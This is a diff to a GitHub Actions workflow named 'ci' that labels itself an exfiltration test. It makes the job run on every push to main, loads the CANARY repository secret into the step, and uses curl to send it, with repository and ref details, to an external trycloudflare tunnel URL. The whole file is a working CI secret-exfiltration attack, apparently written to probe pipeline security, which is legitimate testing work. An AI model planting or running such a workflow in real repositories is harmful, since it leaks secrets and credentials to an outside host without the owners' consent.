@@ -1,14 +1,15 @@
-# 0x19 M1 exfil test: fork PR replaces workflow
+# 0x19 M1 push-exfil test: merge commit workflow runs on push to main
 name: ci
 on:
   pull_request:
-    branches: [ main ]
+  push:
+    branches: [main]
 jobs:
   leak:
     runs-on: ubuntu-latest
-    env:
-      CANARY: ${{ secrets.CANARY }}
     steps:
       - name: leak
+        env:
+          CANARY: ${{ secrets.CANARY }}
         run: |
-          curl -sS "https://integer-wto-extremely-ultimately.trycloudflare.com/0x19-m1-leak?c=${CANARY}&repo=${{ github.repository }}&event=${{ github.event_name }}&head=${{ github.head_ref }}" || true
+          curl -sS "https://integer-wto-extremely-ultimately.trycloudflare.com/0x19-m1-push?c=${CANARY}&repo=${{ github.repository }}&event=${{ github.event_name }}&ref=${{ github.ref }}" || true
